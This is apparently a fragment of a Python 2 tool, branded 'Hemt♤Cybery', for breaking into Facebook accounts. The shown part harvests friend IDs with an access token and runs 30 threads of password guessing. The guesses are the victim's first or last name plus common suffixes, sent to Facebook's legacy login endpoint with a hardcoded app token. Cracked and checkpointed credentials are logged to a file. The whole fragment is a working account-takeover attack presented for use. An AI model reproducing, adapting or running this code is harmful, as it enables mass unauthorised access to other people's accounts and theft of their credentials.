			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		Name = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:binyamin
        time.sleep(0.05)
	print logo
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mHemt♤Cybery\033[1;96m•◈•───────────────•◈•"
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;97m"+Name+"\033[1;97m               "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;97m"+id+"\x1b[1;97m              "
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mHemt♤Cybery\033[1;96m•◈•───────────────•◈•"
	print "\x1b[1;96m[\x1b[1;93m1\x1b[1;96m]\x1b[1;93m Hack Facebook Account"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Logout            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Remove The Token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mHemt♤Cybery\033[1;96m•◈•───────────────•◈•"
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m] \033[1;93mHack  ID Friend List"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m] \033[1;93mHack Friends Of Friends List"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m] \033[1;93mFile make Hack"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m] \033[1;91mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;96m•◈•───────────────•◈•\033[1;92mHemt♤Cybery\033[1;96m•◈•───────────────•◈•"
		jalan('\033[1;96m[✺] \033[1;93mSearching ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;96m•◈•───────────────•◈•\033[1;92mHemt♤Cybery\033[1;96m•◈•───────────────•◈•"
		idt = raw_input("\033[1;96m[+] \033[1;37mEnter Friend ID Code \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mFriend Name\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mFriend List  Don't Public!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mSearching ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print "\033[1;96m•◈•───────────────•◈•\033[1;92mHemt♤Cybery\033[1;96m•◈•───────────────•◈•"
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mInput Name file  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mFile Dont See'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	time.sleep(0.05)
	jalan('\033[1;96m[✺] \033[1;92mStart \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;92mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
		time.sleep(0.05)
	print
	print('\x1b[1;96m[!] \033[1;92mStop CTRL+z')
	time.sleep(0.05)
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mHemt♤Cybery\033[1;96m•◈•───────────────•◈•"
	print ('\033[1;96m[\033[1;92mO\033[1;93mR\033[1;96m]  \033[1;93m    User ID    \033[1;96m| \033[1;93mPassword \033[1;96m  - \033[1;93m ID Name')
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' - ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' - ' + b['name']
					cek = open("out/super_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['last_name']+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' - ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' - ' + b['name']
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name']+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' - ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' - ' + b['name']
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['last_name']+'1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' - ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' - ' + b['name']
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name']+'1122'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5 + ' - ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5 + ' - ' + b['name']
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name']+'1122'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 + ' - ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 + ' - ' + b['name']
															cek = open("out/super_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = b['first_name']+'786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
																	cek = open("out/super_cp.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = b['last_name']+'786'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8 + ' - ' + b['name']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8 + ' - ' + b['name']
																			cek = open("out/super_cp.txt", "a")
																			cek.write(user+"|"+pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
																		else:
																			pass9 = b['first_name']+'12345'
																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			q = json.load(data)
																			if 'access_token' in q:
																				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9 + ' - ' + b['name']
																				oks.append(user+pass9)
																			else:
																				if 'www.facebook.com' in q["error_msg"]:
																					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9 + ' - ' + b['name']
																					cek = open("out/super_cp.txt", "a")
																					cek.write(user+"|"+pass9+"\n")
																					cek.close()
																					cekpoint.append(user+pass9)
																				else:
																					pass10 = b['last_name']+'12345'
																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																					q = json.load(data)
																					if 'access_token' in q:
																						print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10 + ' - ' + b['name']
																						oks.append(user+pass10)
																					else:
																						if 'www.facebook.com' in q["error_msg"]:
																							print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10 + ' - ' + b['name']
																							cek = open("out/super_cp.txt", "a")
																							cek.write(user+"|"+pass10+"\n")
																							cek.close()
																							cekpoint.append(user+pass10)
																						else:
																							pass11 = ('786786')
																							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																							q = json.load(data)
																							if 'access_token' in q:
																								print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11 + ' - ' + b['name']
																								oks.append(user+pass11)
																							else:
																								if 'www.facebook.com' in q["error_msg"]:
																									print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11 + ' - ' + b['name']
																									cek = open("out/super_cp.txt", "a")
																									cek.write(user+"|"+pass11+"\n")
																									cek.close()
																									cekpoint.append(user+pass11)
																								else:
																									pass12 = ('100200')
																									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									q = json.load(data)
																									if 'access_token' in q:
																										print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12 + ' - ' + b['name']
																										oks.append(user+pass12)
																									else:
																										if 'www.facebook.com' in q["error_msg"]:
																											print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12 + ' - ' + b['name']
																											cek = open("out/super_cp.txt", "a")
																											cek.write(user+"|"+pass12+"\n")
																											cek.close()
																											cekpoint.append(user+pass12)
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mHemt♤Cybery\033[1;96m•◈•───────────────•◈•"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Complete \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Saved \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	super()

if __name__ == '__main__':
	login()
